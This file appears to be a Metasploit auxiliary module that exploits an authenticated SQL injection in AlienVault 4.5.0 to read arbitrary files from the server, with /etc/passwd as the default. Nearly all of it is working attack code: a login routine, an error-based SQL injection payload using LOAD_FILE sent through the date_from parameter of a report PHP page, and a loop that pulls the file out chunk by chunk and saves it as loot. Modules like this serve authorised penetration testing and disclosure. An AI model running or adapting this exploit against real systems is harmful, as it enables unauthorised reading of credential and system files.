##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "AlienVault Authenticated SQL Injection Arbitrary File Read",
      'Description'    => %q{
        AlienVault 4.5.0 is susceptible to an authenticated SQL injection attack via a PNG
        generation PHP file. This module exploits this to read an arbitrary file from
        the file system. Any authenticated user is able to exploit it, as administrator
        privileges aren't required.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Brandon Perry <bperry.volatile[at]gmail.com>' #meatpistol module
        ],
      'References'     =>
        [
          ['EDB', '32644']
        ],
      'DefaultOptions'  =>
        {
          'SSL' => true
        },
      'Platform'       => ['linux'],
      'Privileged'     => false,
      'DisclosureDate' => "Mar 30 2014"))

      register_options(
      [
        Opt::RPORT(443),
        OptString.new('FILEPATH', [ true, 'Path to remote file', '/etc/passwd' ]),
        OptString.new('USERNAME', [ true, 'Single username' ]),
        OptString.new('PASSWORD', [ true, 'Single password' ]),
        OptString.new('TARGETURI', [ true, 'Relative URI of installation', '/' ])
      ])

  end

  def run

    print_status("Get a valid session cookie...")
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'ossim', 'session', 'login.php')
    })

    unless res and res.code == 200
      print_error("Server did not respond in an expected way")
      return
    end

    cookie = res.get_cookies

    if cookie.blank?
      print_error("Could not retrieve a cookie")
      return
    end

    post = {
      'embed' => '',
      'bookmark_string' => '',
      'user' => datastore['USERNAME'],
      'passu' => datastore['PASSWORD'],
      'pass' => Rex::Text.encode_base64(datastore['PASSWORD'])
    }

    print_status("Login...")

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'ossim', 'session', 'login.php'),
      'method' => 'POST',
      'vars_post' => post,
      'cookie' => cookie
    })

    unless res and res.code == 302
      print_error("Server did not respond in an expected way")
      return
    end

    unless res.headers['Location'] && res.headers['Location'] == normalize_uri(target_uri.path, 'ossim/')
      print_error("Authentication failed")
      return
    end

    cookie = res.get_cookies

    if cookie.blank?
      print_error("Could not retrieve the authenticated cookie")
      return
    end

    i = 0
    full = ''
    filename = datastore['FILEPATH'].unpack("H*")[0]
    left_marker = Rex::Text.rand_text_alpha(6)
    right_marker = Rex::Text.rand_text_alpha(6)

    print_status("Exploiting SQLi...")

    loop do
      file = sqli(left_marker, right_marker, i, cookie, filename)
      return if file.nil?
      break if file.empty?

      str = [file].pack("H*")
      full << str
      vprint_status(str)

      i = i+1
    end

    path = store_loot('alienvault.file', 'text/plain', datastore['RHOST'], full, datastore['FILEPATH'])
    print_good("File stored at path: " + path)
  end

  def sqli(left_marker, right_marker, i, cookie, filename)
    pay =  "2014-02-28' AND (SELECT 1170 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},"
    pay << "(SELECT MID((IFNULL(CAST(HEX(LOAD_FILE(0x#{filename})) AS CHAR),"
    pay << "0x20)),#{(50*i)+1},50)),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS"
    pay << " GROUP BY x)a) AND 'xnDa'='xnDa"

    get = {
      'date_from' => pay,
      'date_to' => '2014-03-30'
    }

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'ossim', 'report', 'BusinessAndComplianceISOPCI', 'ISO27001Bar1.php'),
      'cookie' => cookie,
      'vars_get' => get
    })

    if res and res.body and res.body =~ /#{left_marker}(.*)#{right_marker}/
      return $1
    else
      print_error("Server did not respond in an expected way")
      return nil
    end
  end
end

